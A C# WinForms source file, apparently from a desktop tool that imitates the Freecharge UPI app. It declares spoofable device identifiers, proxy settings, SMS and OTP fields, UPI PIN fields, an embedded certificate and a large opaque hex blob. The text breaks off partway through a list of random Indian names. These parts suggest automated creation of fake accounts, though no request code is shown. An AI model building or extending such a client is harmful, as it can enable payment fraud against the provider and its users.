using Bunifu.Framework.UI;
using ByteNova;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Encodings;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using QRCoder;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Web;
using System.Windows.Forms;
using static APP_FRAMEWORK.Freecharge;
using static APP_FRAMEWORK.Freecharge_htm;
using static System.Net.Mime.MediaTypeNames;
using Image = System.Drawing.Image;

namespace APP_FRAMEWORK;

public class Freecharge : Form
{
    private string fcversion = "578";

    private string response;

    private string string_93;

    private string customerid;

    private string fc_v;

    private string txnId;

    private string text6;

    private string string_92;

    private WebProxy webProxy_3;

    private CookieContainer cookieContainer_3;

    private int num;

    private string string_96;

    private string string_95;

    private WebException webException_0;

    private string csrfRequestIdentifier;

    private string mobnumber;

    private string otpId;

    private string modelname;

    private string oemdeviceid;

    private static string[] string_0;

    private static Random random_0;

    public static string freeChargeApiHeader = "FREECHARGE_V2";

    private static Random random = new Random();

    private string encmob;

    private string cske;

    private string upiact;

    private string smspart;

    private string uniquedevice;

    private new string Name;

    public static string listName;

    private string aesSymmetricKey;

    private static int LenghtAesKeyBytes = 32;

    private static RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider();

    protected static char[] hexArray = "0123456789ABCDEF".ToCharArray();

    public static string x509CertSecondService = "-----BEGIN CERTIFICATE-----\nMIIErDCCA5SgAwIBAgIKFzMa/spgXyVfATANBgkqhkiG9w0BAQsFADCB9zELMAkG\nA1UEBhMCSU4xRTBDBgNVBAoTPEluc3RpdHV0ZSBmb3IgRGV2ZWxvcG1lbnQgYW5k\nIFJlc2VhcmNoIGluIEJhbmtpbmcgVGVjaG5vbG9neTEdMBsGA1UECxMUQ2VydGlm\neWluZyBBdXRob3JpdHkxDzANBgNVBBETBjUwMDA1NzEXMBUGA1UECBMOQW5kaHJh\nIFByYWRlc2gxKTAnBgNVBAkTIFJvYWQgTm8uMSwgTWFzYWIgVGFuaywgSHlkZXJh\nYmFkMRUwEwYDVQQzEwxDYXN0bGUgSGlsbHMxFjAUBgNVBAMTDUlEUkJUIENBIDIw\nMTQwHhcNMTYwMzMxMTIwMzUyWhcNMTgwMzMxMTIwMzUyWjASMRAwDgYDVQQDEwd1\ncGlucGNpMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsqMattxoTibl\naGsAneFo5TgFfvRltQ2CqteIgUVJlLMz95P35Y+GQc2EOjVEO0L1OUd5IDTIBaqh\nrTqeWypOyna+CsHPqDRY0vsklCYizw/VQkdwLBZHMMhU4jL4wciE7qcf2kdyri6B\n135SzUF5IGPn4SnSkeB3IqHzneUrabP0lJweLF7IU5l9qtpPa6A5cH1iVKQT5YAI\n4NWH+3E/MRNKvdqgU1PILlOEaVB0vJZ1pBWW1aMaecoHfzC8/pTfM2PJ5s/CDbR0\n4xqX9/AYmkt34jMwBKvboyWjD1UgCkPnJd3SaZ4vDpA+nyTITM6uGOI6e6sv/b6v\ntF7nbM3H7wIDAQABo4IBHDCCARgwDgYDVR0PAQH/BAQDAgWgMB0GA1UdDgQWBBQq\nlITKolqdgylQXHZgJ1WJMLhvnDAfBgNVHSMEGDAWgBSAdQI0B9ReDs4FarWs8BBr\nQhsHxzAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwOAYDVR0gBDEwLzAt\nBgZggmRkAgMwIzAhBggrBgEFBQcCAjAVGhNDbGFzcyAzIENlcnRpZmljYXRlMBIG\nA1UdEQQLMAmCB3VwaW5wY2kwWQYDVR0fBFIwUDAkoCKgIIYeaHR0cDovLzEwLjAu\nNjUuNjUvY3JsXzI3QjAuY3JsMCigJqAkhiJodHRwOi8vaWRyYnRjYS5vcmcuaW4v\nY3JsXzI3QjAuY3JsMA0GCSqGSIb3DQEBCwUAA4IBAQB6Y1FmD1GRKdEW4GINYutM\njDxZmHy4HGFmkE3xZjQx9aDT34TpLSNpsg8jUF+nW/KUMb+nWKJuIRZESYfBSCS9\n2fP1AJAO+PKopJMep/weJ+6a0ydPeoKbqKYllTlmFy+DPC56/UuEBQ9iIX3n5RW9\nxZFTB3NFC9A8zhxCBTsxizElrP8Jd4s+I3+qzJIw9ZqGknDgipyYoi0GGx2mjfwH\npg4YQ4/2xjG2ZRQwkgEmcxy/NvbXz1NV5P5u7dit9SwX3gaAZybu2guIcLFcVEvw\n1VpioZlgPjr5RVhyGzX+tBS8rapTNG1C8A7ANLxpk3nqYzNh4XjhMm5EQ3oKDD9d\n-----END CERTIFICATE-----";

    public static string packageName = "com.freecharge.upi";

    private string upiid;

    private string bankcode;

    private string bankName;

    private string accRefNumber;

    private string typea;

    private string maskedAccnumber;

    private string ifsc;

    private string otpLength;

    private string names;

    private string miib;

    private string ki;

    private string upipinn;

    private string atmpinlengh;

    private string dlength;

    private string dLength;

    private string logo;

    private string app_fc;

    private string Path_;

    private bool balanceshow;

    private bool register;

    private static List<string> list;

    private static string logExitFile = "Log_ExitF.txt";

    private bool ip;

    private string ipfor;

    private IContainer components = null;

    private TextBox mobilenumber;

    private Button button1;

    private Button btnNext;

    private Button btnCopy;

    private RichTextBox txtSms;

    private Label label1;

    private Label label2;

    private Label label3;

    private ListBox listBox1;

    private Label label4;

    private Button button2;

    private Button button3;

    private PictureBox pictureBox1;

    private BunifuImageButton btnClose;

    private Panel pnlHeader;

    private Label label5;

    private PictureBox pictureBox2;

    private CheckBox checkBox1;

    private FreechargeProcess freecharge_0;

    private static RNGCryptoServiceProvider rngcryptoServiceProvider_0;
    private BunifuImageButton bunifuImageButton1;
    private string Cert = "0000000CE88C6B9C42AB186DEF34362A74641E6A53CA63A6FA95AE55A7A7D9C845DAEB669B617F5CB6CC677654B1B9BCBE7A49C5ABFAC759BE2AA71FDD7A6EEB9DB0AC3526FC6FA5C9468282CEEE6E901D2892FC4C364D1E184FC02423492237ED52AB16734784FA36F95AE660FAE0F39621D8CB9884E4F6A84952C90508C214D2CC889E9911F9233B90C3245685582AEF4228D16B3519512EE5AC901CC1E49305819A7AC692D00FDF5D00478E8B72C412569B1CCB3C8732C19E70058A091CEB45FD62F8AD5FE4E9ADCB2D40536BB807FB3BC405111AC19ADD8B2DE76021FFA81C27DF60CD69E0B3E58DE3697C5FACE7BEA2BB0CF9439F8424E6AD5A0DC75A05C7D977A9C1801C04201FA313AA05CE2AAFDEDEB971B3CD0746F1277B75CB5BF059D8B9B1D368EBFC72A793CECA67F4AF4F5B1D5F82D9BF0E94362FF1FEF2A9CB865BDA186F8A18B8CC19EA1EC611A30F68DBA5AB46ABEFD2F8AC8587ED134FFA709FD164160B6AC2F0625E60B60EB2CC3132E7CCDC794F4EFEE1973E67A1FEA97A4AEF25311DC5AC2B40691D96CE836CE6ACF657A5C6A0D893187269E2555BB7F17BACAF237BC13810484D8885E716D81A39395B2EBDBD50CF195AE4F9EF371E8236CAD42358E576ED6295065FB75CC7FEAA09F8C8B623BE829A87DE20F59593334E242EA34A5BBAA09C6839E5D296EADFE1FF39A4EB8DD12B8EC94CD4FFE6C436448A4C8631C6CA0442451CE7E1CC029360D9B2.3.4838BB1FC53D5E226F8C84DA43A7F86D0BE02267C3029229C1B157BDFA47CC4BDE5941112E9067C946577930A2BCEE9B20F16AFF9180FFB18EDBA6E54745B6D8120C9E8F178B52B2C6A4853C22CF7446A8C54C15E0646179F856680BDA9A776F1D28BD079DDA0702321CE07BF58535277C414483E5192368F5DE10D7351FBFEC3495C1D9314F0CFAEB4E8C784D5618B2C19302416F29758C29FA0D67424C9A9D3EBCAF911D9DB5021502AFA7EF54429E05EEE8D1D2C4E3E806A28E3236257161A3689F4EDDEB93616A763A1F7FFC777F8E26A60C244F5BA27E92EC28F6EDCD63F1AEFB92C4A72A460B5C9D53974EEDF399AB6A09FFD44D292D3657D6CA88DC4A6B9063B194C06A19A05FB67D21D1EFF3D0C9ADCE018943D3423A2182ED32CB3141BA1A417E3B346E54DD954B501EDF2F029F82800E1119FF76CEF6A1E52CE28F9CE48D712FFBE51D03577DCDCC3FEB6CDB9A6C47136690671E2855D0A0B317C410E92A6FAA583CF3D7A51828B08C434735D4FF4C58DDEDE5D089F2ED2231F85A69BA9C4D3C1818ED59B52EFE1E0FC2D56A139216379FC117CB781E0CCEC062CFFF2933C3AE2C7BDEDBCC28A12588CC2C812073691C71113B2505769B99ADA6839BFABAF1AFCAA79D734BED7C576CD0B4A7649209F6AF172BC0DF325A974ED0046D897FA55B6DCD591FBB986EC171B9C8817F6D85AE1B7B78746731D041107CFB78ABD695C095155900DDCC146626938781515706F1D394558A505A08708FE9E290F19506697B4A35B87A85477CB5A98CE0BB6A0CCA340CFC559ECF743B9C83C169943B15FB7F8C1D04E60D5631B9772A02A1345717ECAE5DFCF508504EFBE0908B6F530F266B25BD534C5B6D9F8BA2EDDE81CA4B24660F1B14F7B4A2324F5687E8F97A863FA090C94FE4BAA99B781A9DFA29687554215899B555326EC00201D4421F49D88608AA6690B0B6194A41FEEBCF7F3A1FF166ACC81D26AA0DA744AE567D967C9D7F076AEC276A3F19F5C5301FDE9C4EDEA3F5B927512660EB2FF0DDD04C14B0898142687763FE4224425BC49CAB89841BBA125FE2E6A8311F114C1F978537955C7A8AE280C82BF86213FF468946BBE6F55DB530A94075AB8E6ADE3FA71DAB5043352D33F340A694F08A40A910D767CCEE2B28ED77C36E869AA549FFB291236D26B0427FB057C3A0D5EA2DC149BEA894E1B9EC64DB6461F658FB6BD4DCFF2A2ED4B65C18E13EFA2ABA7AC50DB35B7932ECB31F3820069CDFFD23E700713CA719F75009D169E850EE117C5449608436228D308B253B1B3BC60A7357DCCA47730F42E5E8AB5290083CD687069EDCC41EC666CD549781C3A445C1029817A676E734DB9821F4DD8B01C35FAD7A9425C10BC1167ECBD9C9AAA800D692CD77747DC2F88795E7364D64B24977254106CF780CCEB365C5B67465DD4765D3112FB2916E4F3FBCB75E7B0465E08061A041E1AECD558AD0743564708B2CD2F42CEFDCBFB95D21DB846C8C232CDEE9A0B9685DBD55D54D24C226921F5D930FC8E12BB739F00D4246A37ABBFC97C3798849BD2ACE43FC0E99BEDA620D2E88F264F9304CBD670E7C870686BABDF91B7336F933A4BC8589FA964D7CFABA8789F53C83679A38E4099125106D12EEE970F3338BB69D8C5D72744136E46D9CF8C3F4FD89AC4A1154FC43DBD2F5742485D53C9EF6D1AD859E3BDAD18A352A85A2E6C2477AAB47163E6F102E267BD7D1C189C8E8FC72E4EB8D847B2477D88F0D702A3F19AAD7885D4D742AF4186867E3FD310C8581CDC01595010885954CBED25E896D9E55B054E6ADF9E1AD0FAA7B6A9A94E5F0D5F78F355DD1C7438557710A34AA6B3620EF32F66BE51474C708F54F9C9F1415A28DDA75A266C7FB7DEB7387E4FA0EDC87DB6CB91811742BB8CDFDEF61FE32A0CCCCDC8A14AE1AFEE2AA366C4AFD91DC2E9D1AD067C70F2FCE89242F92F59311D99DF9DD8B9C1A0FEBBE49925C53A6821CF4AF8B97473C474C2CEAC417372B3ECA8B3955F041CBE6315060C4324ADB1F4A8D982B09BB94C46501DEB98CB4F29D8BB8B64361C1BBFF31C94A5341790B7F8313EE07FEA9AB8116CB0C18911E2A1EE849692A007FDF698B339BDB6237DDB9EDAAF7231E4D3E4705A3C09D5F6AD5F5378BBBE1BB49CB22F8CBAE56C7B3C7E4F131A433A11D37AE2C91E361D86BA733BC38BBE606C4A167EDC60A1EF5DEA3A1582443688E8B12BAE49EA9D6A0536D36BB8E67B5352D5230D0A6F330F529DE8393395B070FB35694D54E0B4B1FA3AF98ED1008007A1240B24F798BBA969637BBB3881AEEB8B81D971F0C953AA5BE78BAABAFD169497357BEA6F4D08AE5FFB81977F784E5B122264F8504DA2D1AE8672347E215D2DF4A10B19185B3F3AFCAD58B396123D75CADA67A9FC10EA34BE933D70490AE11E3B7756F50EADD245029B39656CABCF6084FB575F21885E900CA74754D483FF71398A4FC1A1C519C8BFA9BEA4F97D2F60DE87AC63635D2C3372EFCB5770F670431B7BB2DACC49A56EE3D3266485EBC830FF75E5298DD33E984AE7BAA33CAC9A7DBBB4DA17E41BE6D79032D709E3BA31A42D3F8731656EF1A31B897142EF68DF6D7258D48551CC92743B67FC16F3179934422B18A95B5CB378E2782B3C3608F64DCF1E118A0761BAAA6840F2B1275126F1A658E83F9AD0AC406ECBCD53D332F6E6786A08AD142EC245B3F0E5600217296F2A5C22683642C5EF22E304B60A5F34C636A46FC65FD86140026E15824369F9AA68CB814FE8D2DEB87BEE753B8E4D749122D3089044EB0E633000571A4206D47400FEEBC3D7E3430378D144A44E7E465E1C01D47AB131BEE021038427507D036538C4B913DDE49E4901A364AC34C046ED0F0B7196FED4D66F0ADE37161C8B0D27E8A666FAD69C71AA4837776902149F7F40A078DC980948ECB9B10CD13B2804460941F73EB1C2164E8907436D84F47310282AE37D65073E65DC16200D6483DD23A3B2EF781DF0B146002ED978241A97159BFB362F5C37EEB16E1A92AF995F16B52B342658927CAB7EA3C537E1E949352600E1F666C1FC998386FB482AE3AAA203FD6C99DC3440DFBE7F5101A3BE73670EF0BD35EA320225D3AC1B836E12530CFFB226A18989774A47A6F6B588E9E1E4B0B76D3A4B56525B0CB4B36EE86B67633D936155B1DFBF594E1F567CF1AFA112A73CF65065F4FCDE64DE08162171FB3408C9E15124CF86A7FBC3FC1D8910EA04B6B04FD159C4D9796BE5CE6E66B016A8EED266CD98076250E1DB5366F26F2F898BE8ED961B86B7E70411342230163EF03A37E20C4E1595A13B4927FC6C99BC2EE44791F2C1E1DAFE21C232E023067545677C30C55A5BF32D04FA72E94CDE4562A041C8455FB6799864029D8C432EEA26DE2426176A5B83340E46ED100CC0C652C4FC0919BA7A7CEB251BC54402958AF6D06383E9E9A6B2665BA247B91EAF345F89BD5FB6EAD6F70FC924674025197A365A81CEF37CB5D09E7E58975037B20FD282E7AE0F79FC0F1419BE567296BA3F8E013046CDED79A9A465AF0E1D7E2674E7992C4BDA0C6E9281E71D460915371121C600E77ECC190BEA1E7B2BD4777EC47EE0669E82C1DB804CDD7BF1388B4FE8053FDB962BEE543161335474829FE61B42032E11B1E9E5A1984A857DE74A7861FC431964BCBE2140B8139711F713E37B8EE713FD8B98EA0BA170517482160B6F2B34A71AE55EF02CB7384D0D2F67A2714A9F3ABC897214027E7732B582078FDFE1D5DEF22590F44434FA5A08624D26790C08468841978A38A8FD5F592B8F2D748AF93F90DBDB8CDE61BFCBC84D1D55838C914CEFDB774550E319789DE590DA2872D1EB4ABA74828EDD5713830EC6ED04F44B1B0334C30A4983F3F13BD8A1499C0A4B2BAC8AD1262B7233ADE65C45CB6B997243E92FE5570CACE7FF65BF4C18A1A655D7F2F3E1955770761188AAF7815E779C734B8B5EF2045F5F3955A0E61007E572DA9EFD2702B0F60AAFC7E1BEBE4E6DC0D3F4FCAA13E2E8048D8E67C8EC6FEB29FC81226E71CC319EA9D58CEF9F0E51DA6FDF8264096544E6D7F6F126E01A317A95DF9CB7A3B8CCC64390AB180E62B1975FFBCF5DBFD138A87A775B29EEC2F55D8E7C15C324B942244A94D127B24D072D25DE956082F1B3E1455F35D4E230299B8778A42BE832AC138CA7877B23FCC9BEB4752D9B07C93DA36E91BB0FFCD34E7EA77C562B90BD28EA7C0E0118FF1818843314C6F31D5F2B41AF3512BC69F219AF0E33ADCCA5937ADBE641E5B5FCDB0BCEEA327A511C66E4273352E28BA07CDF1726D0CE697C5CA2AA4AA556517EF1560F8D337CE64494973746FA16EED0D1A61D76F4EDA3E8B264F3DB86B6448E7CE9E0526D8B8F730D5F2442435F0B074689DEDFE25B076A659367114FAB2D74A67DE8B97BCCB0144E9DC0D52CE98EB9030EABEE58477C44E746705614B275E53E4FDD075412B4D9B4A13A3B14026E44BB39BAB82CAD626DA1828CB92B4836653A5C46ADEFB38D805DECFE0DCECF471087B125E07EA2EC7988748B1D414A46873FF6EEB686948B3FD723A033C6C1F0A16755A08877CEDA3B67E53532FBF2F797043DB0DEE71C7FB45DF7E754A19FDAA77C56DD470E96A4669A8E63FE3EC4B4FF1C3601E0A07B0F29AC7102C9F6C1F6224B64D3D5A038B19193F3E0305D30E6F1A38BAC07C849C27F41248A3EEB355C0A336C06A4D41F13236CF0C7C3F02AD8067E2B19CBDBA7EA6760237AF1316ABFA808166AA76584ABC7814B99995248734858EBD3D2A048D20562878F12160254129E610260AB37634F0A49B0CFA4834DC59267ADD971A6D50CACAC27944B4C9284BF28C15C508E2B046F54A53970C13198101BBB422D9428CC19F3B66EE61C297A8B007D3111FED95DE43D46A3D1D1C1D69B506382CE74EBE09190F540063618E551EE37659658E80456971B614A55F0A8239CA1DE02AD2D619269B649C7FA4F722723DAA160E8935B87C1179BACA2DFC0F78D264DBFBAC39FD0FF7674F8AC508835C4635409DB4E0DC7429011A3AC0496A7A7458A403869571B1147288E1AB058D5BD299BB7CA82B3DCC8CF1A753E5C827B0EE4E08722C6D88867692088BCEFE8FF0B6D4D326879A0A2D511FD2C2FE51179F31EEE3C8B5710E709120211AD5ABCE7255FDDF18EBACA20A03F1BCD959020C901EAB51AF640559B6683D9547E87C2D52875263AB6DF261A9F2556F110E1BCC3AE97CD170C699D29E5D7E6F81E09A0DE17F959F62191FC0440D2074A3941309BE83E0481247999AD63057672D5F050DD47870EA61416A1EB1683A1E19A481AB3F69530B9C227909DD8F902A358A69719A95CCDD316083A1A4CE12602102C292725150264BFFD4A40CEBED6F108DA15A6CAC4CD71087EBC2A5B191D775679E7C03D3489AE6E89A676CE433945A9077BDC2038F278A24EB7CABD56971E7FB43CE3A112364B1005DCD8DCF6C4AEA8F9C4EF3B7CBA2650D5DC0D85FC8AF436B0C1E5DDCDC17572E5FAA60D78DC954AABDDA2CFB23251A94E674B1F5D35C4CA3C6AC35C1D633DC5A8539A5B51E468FA6D06EF35B1CD3450D45F924A4589EAA44BBA0AF6B609EE67F07D53B83C8A156A6CFF67B0E5084155E99959B4411DB556C6640A96A70F4754EA24E39C7EDD3C4F3038D4356BF4B18240E49655C824FB21A0878DACD0E3B03041D5243FD505D81E0F30D95E659172DDD8573057A7266CA9A8CA6F81E20EFF1163B4BF2CBDB62D524D0E8FFAF7B29622FBF2581C164963B17EDF25D460438663B06CC2879BDA08E5B4CFEF2A3C5CF423704D9F800F913DEE11D0879EFFA559BCC1379CE2905B57FBCC6C4CA8E714127325ECC1F11A19E5AB2F15C9576BCADF904A2071075C3B05D08AD4FF1B862D65B440ACFF353630420A2C69FAC2FDC45FC2C3F15D8A673B33AE3151F6D122DE9D4A69067806FED5C2B6643214630A77BEBA7E6CB1B089FFC412CAE9D67F2D813ED9DC035CB58188781A8E890753089C3DE8210DF664399FDFDC92127ECE547A81FC1414EF7B08156597FA975EA31281DEDF6C7E6291149D71397BD66203A08268F908A984E0E4425968E63BA85777B83A0172703D383DE8ABE920D8FCC4DD59E9146037271A5BAA1FFD1F69D98264DF16735137724269B3300A8AA06D8ECE74C73DDAB7ECB4948BFC5F3A12B5903B8D712C39EF0C80EAC43ADE5C391CAE36260284E1B7EBD4B3DCA3366407C0FC51D7D0E418B496B0C95EAECDC4886D331876E40CB6EEC11079D19D5B74CEAF933CFEDECB9D0259BA2035C85A63AC4CFF444D8F6531CDFF3B11E3837343063B0F3C270EBA1F159F8F04A955AF39B3363EE9B85ED8B987A26669F8F24E9079BC290DA7AFEB2D820A02228B202641786FA5F2D5B2A5E42DCBE94BBE2621121E7950EE24A7AF4FAD2E72B6095414142FE26FFF095D2F40DB60C7DC336910BCE465A45196E8AE708A252994FAF2FC18A6D9C51B2B83BA77890AC6C5996BE38EADB1F56956F911B3122D87485855DF31F7D5592BE5FE9CB0B557650B27C47CC0E7446E2DC3B5D18648191F85712FC92BD467D0FECA559B3225546F4F76DC1C6466006B15686367EF459824EDC6BF11C9FE794FA0583273E4CC083BD4C4CECBAEA145B229865A79FF7D38F71905CDDA6C58FEBD406FFE2680DCBD427EEDA3D3818E4B9A7A7B30F2C92D304F2373BE9001DCD3CDBA551CDF7C0EB466209D20CE4063B7F2374250D7D2FB2E2C0AF650E28BF1587DBC697EB18A983F5995C2396E9A7A99D6818FF145D04749002BB05BEDC37413234EBC49D76EB90664D702C3DD1A217BDF0ED386A5931097FAE88DB1AA207445AD20C1A8982FAE1C2DF264569F5468B2FB6EC6BFA2281EE80B4E3B883130F73AAA126C97C0D3F8EF163907C160C8757D5E5F1145754B0983FC7B4D019DB9F0E4C6729B046A54302882667F111806D9F3AD55350B0A6EE26B44E46A721A26B5905486F17B7C5BE70711920F00278A04114895071BA1001DDF03749D98D86200FBE258C542E2B9C8778FC6F148C9561A69C7DC2C4133B5D7B7282CAAF6D93D65F8892658F6355951FB604BA5D58C97E7DF63E3DF21D73BEEA66E67F93EB160572BCC196003F7450E5261CC2A6D6A18DCBC0B81E3C8B4A24B8463D6468FF3EE7F4FE3FDFDEF2961A8B216A4ADF26281DAB800CD09792B6C51DD6156302366241A2D5D42F1BD318CAE63FA6D65EB1604543BE7BB41DCCC0F5596552D638D98A69B22E40EDDF05F82A0D815CC2CCD3B9E76CF3E2651F44DD80C8B3EDF168FA17E74EA1051DA6588A236E61FF6D07101D59CCEBD4BE97D924262EA6A26EE03C9AD0667A89885A329FBA18DD15BD88EA1FA21EF9C4C0BDD4CCC06CC310CCBC759EACF12B94A44B590153ED2AEBFF6A4D43AEE8B2BF70074C7C5CFDB1377BA7E20E50871AFF8DD51B5D2C5C06AB82764DA8A260C7463768EA3AC2BD7A7B02409FFA4E4A1396C1BD9880CFB73180F9D3C980355DA4874DDB03355C1D656EE80157FBE6AB002C175CEB9FE5D55D5E57828044285943813412B568209621CF4C86C42EBCD584178F903B6B53BF051158A106FD00D520B84F1CAB8FE69E6C186F9C32360AD45B733B09F315CCDE3EADF681AE28C5A00BEE3EE036B5A20EE83A1419B8B1771F67F820C5A63FB73D6CCDC9CC14F1ECBE3843D884BCE4097BF73C444E478E02DD500D508EA2F4F51E61686A9C86D1B00CDF49B03CF885269EAF75D4FA84444E883B371613B31C3B8A02853FA0B1EFA50684257E2FBC4628E5FA43E4AD42FDBEA8AE050E1244AE3D2B73B93F470885D9B7C88594271350529B46422D7FC720C0B387D0D7691DC3269FAD5FDE280F48F8F7BC7E7319F7F0BD80829FC344AA67A94ACF8CB530AE4444B3577CF5241D9BEE86CE18DC9AEBFE9E9564BA46B4C235057AC6F04CDB5AFCF03C91938D04BA69453B58F405A693A9FD68B1F5968B7A9D8A00D0F664772B258F2E7F2C79EF4FA7953726C79CB023CFF17E982330D6AB411C34AADA646626C96928BE42B6B16AC7FE71DDBA0781758419057A513F8DC879415C2E5BC16DC8AFA05D4A188F85CEC74EC7386B5629CD6FE30D9AFBE97A8A74DC67E3E06FD242057AFAB0C3E069A5EB81D09D19F50F68590EB1803107A87B666A6860C08C18D704EB4D58585B1B92D5F6B8973CA516990699B18196DECA4786B5E61E59202AD9A95310C52082C7A5DD4076E5AFE74C17431AA54814AAAAD61169C312E9F70B6BFBD2C1017375006D292FA12B0968F78EBB9A4AA1C1C5243A141CFE9F718667255CD91F7BB3A8ED5EB6FA08628DF0A6583D4C9ADE264FAF80E6E68EF8F26B8AB97A043EE83AFACF957910BC395A81775A14656C8DC4F01DADEBA8B5D3FCE9D285D4EADFC471EEA56BC866CA67A14AFC1F36AA230284B1F7963C641B1CCFD6C2EFB03DA431C4A4CB280EDFF41BFCE31D0FD5E89CB75860840A516C0C6D6B02ED8CC166993A6FD3A048FF8C6B1311C5D1B5F73EC28F6E6373BC00C618C6C7CEA1EB8594E1983C46120E80420470245743D8ADC409FDFF19F3BEF171DB1F36180207C0A73216AE14E979527AD0259E8DD3DA830759D2D54BB1B67DD5B9D840127E5E2039FA9D92F1EF7645CF6E396623C79B617DF1F9EAE87B3D44E98CAC314341585CCC87E2B23F3E6838A6DDF157B7A440FD5F13ED364C0C306F95DA5378029EB47256BE9BD9190D64FAB93E87FAF46E0523DF20A712EF4AD00444EDF3AE44CE47DF6D7C3A4CF3DE1EA32A90EA7504206F3B9D478F8C6CDB12E57918900BF45A27B30673C1C9EDEA90F374FFE7CF2D44713F3F230AB56228A4D5BE4808C00B93481EBC48D00E56AC6F943300BB85EA01C2F933BF6449E6823BAD6F930FEE6EA7112D2BFF401D0E8D27C24CC145F68DB77ABDEEF52109A478AE178B867D870AAA6FA6739061E857D3481D1B1353E7BAF3E08CF76BA292305C4014095F72892BE0C4518A0CE09E7E9B5A0A462A7B3B9E95C4FE5918070BBD38AF639A198AC7E9906A81279A9CB9EA212DFC109078FFCD742EE2F3D8AF12BA8D4B65C90BAC70E262EF531A851FD60D1C980DC6498A5EE0537CAD655853DBD644C8088AD3AAC94B3BF72B7F5443E33FECF49942563457E3133BB6ABE473B759AC0995A71C0867E168AF4C12779EC034A8E9391FF9B903D2C16F115429B48DE10E9E28BAAFFE3358787237F14100E77A5408AE2F6C4A3A7120CAA308059D9C0226BD74CDC777A551A952377A59F16EEF432D961BF34B2F38E7BA647845506FDBC34A49B959C31C4EE35421559F599D51A567A18D5439D5177298580283BA8C8D99E4A8E0E5D074C1B3D3979163E135D7DDB4A38CA2771BFC8DEB3496DB1B56CDB47AAB8928B8CFBE62FA71E52C701AF7A909E8ED28481F21E4E0C1257E627EBA840CBF9DFDB6C393A7E0E340D06E2778554F7D321979A94E6DFCF361674CF672CA58F278904234C72D1D745D37DF116555565E41CF0C41D68B443D515D4C7884B57BD3AEC295EEC1B87F032A330C4BAF5886523DAD506";

    public Freecharge()
    {
        InitializeComponent();
        ApplyByteNovaLatestTheme();
        pnlHeader.MouseDown += StatClass.Header_MouseDown;
        pnlHeader.MouseMove += StatClass.Header_MouseMove;
        pnlHeader.MouseUp += StatClass.Header_MouseUp;
        checkana();
        listName = "Aadesh,Aadi,Aafreen,Aakar,Aalap,Aandaleeb,Aashish,Abeer,Abhay,Abhayananda,Abhayaprada,Abheek,Abhi,Abhibhava,Abhicandra,Abhidi,Abhihita,Abhijat,Abhijaya,Abhijit,Abhijvala,Abhilash,Abhimand,Abhimani,Abhimanyu,Abhimanyusuta,Abhimoda,Abhinabhas,Abhinanda,Abhinandana,Abhinatha,Abhinav,Abhinava,Abhirup,Abhishek,Abhisoka,Abhisumat,Abhisyanta,Abhivira,Abhra,Abhrakasin,Abhyagni,Abhyudaya,Abhyudita,Abjayoni,Abjit,Acalapati,Acalendra,Acalesvara,Acanda,Acarya,Acaryanandana,Acaryasuta,Acaryatanaya,Acchindra,Achal,Achintya,Achyut,Achyuta,Acintya,Acyutaraya,Adalarasu,Adarsh,Adesh,Adhik,Adhikara,Adhipa,Adhita,Adikavi,Adil,Adinath,Adit,Aditeya,Aditya,Adityanandana,Adityavardhana,Adripathi,Adwaita,Adway,Adwaya,Aftab,Aftaab,Agasti,Agastya,Agendra,Agha,Agharna,Aghat,Agneya,Agnikumara,Agniprava,Agrim,Agriya,Ahijit,Ahilan,Ahmad,Ahsan,Aijaz,Aiman,Ainesh,Ajamil,Ajatashatru,Ajay,Ajinkya,Ajit,Ajitabh,Ajitesh,Ajmal,Akalmash,Akalpa,Akash,Akhil,Akhilesh,Akmal,Akram,Akroor,Akshan,Akshar,Akshat,Akshath,Akshay,Akshit,Akul,Alagan,Alagarasu,Alam,Aalam,Alamgir,Alhad,Alok,Aloke,Amal,Amalendu,Amalesh,Amanath,Amanda,Amar,Amartya,Ambar,Ambarish,Ambuj,Ameya,Amil,Amish,Amit,Amitabh,Amitabha,Amitav,Amitava,Amitbikram,Amitesh,Amitiyoti,Amitrasudan,Amiya,Amlankusum,Ammar,Amod,Amogh,Amoha,Amol,Amolik,Amolak,Amrit,Amrit,Amrik,Amulya,Anadi,Anamitra,Anand,Ananda,Anand,Ananga,Anang,Ananmaya,Anant,Ananta,Anant,Anantram,Anarghya,Anbarasu,Anbu,Anbuchelvan,Anbumadi,Angad,Angada,Angamuthu,Anil,Animish,Animesh,Anirudhha,Anirvan,Anisa,Anish,Aniteja,Anjasa,Anjum,Anjuman,Ankit,Ankur,Ankush,Anmol,Anoop,Anshu,Anshul,Anshuman,Anshumat,Anu,Anugya,Anuha,Anuj,Anunay,Anup,Anoop,Anupam,Anurag,Anurag,Anuraag,Anuttam,Anwar,Apoorva,Apparajito,Apurva,Apoorva,Arav,Aravali,Aravan,Archan,Archit,Ardhendu,Arghya,Arham,Arhant,Arihant,Arijit,Arindam,Arivalagan,Arivali,Arivarasu,Arivoli,Arivuchelvan,Arivumadhi,Arjit,Arjun,Arka,Arnav,Arnesh,Arokya,Arshad,Arul,Arulchelvan,Arumugan,Arun,Arun,Aroon,Aruni,Arvind,Arvinda,Arabinda,Arya,Aryaman,Asao,Asav,Asgar,Ashis,Ashok,Ashraf,Ashu,Ashutosh,Ashvin,Ashwatthama,Ashwin,Asvin,Ashwini,Asit,Ashit,Aslesh,Atal,Atanu,Atiya,Atma,Atmaja,Atmajyoti,Atmananda,Atralarasu,Atreya,Atul,Atul,Atulya,Atulya,Avadhesh,Avanindra,Avanish,Avatar,Avikshit,Avinash,Avkash,Ayog,Ayushman,Ayyapan,Badal,Badri,Badrinath,Badriprasad,Bahubali,Bahuleya,Bahumanya,Bahurai,Bajrang,Bakhtawar,Balaaditya,Balachandra,Balachandrav,Baladhi,Baladhitya,Balagovind,Balaji,Balakrishna,Balakumar,Balamani,Balamohan,Balamurugan,Balan,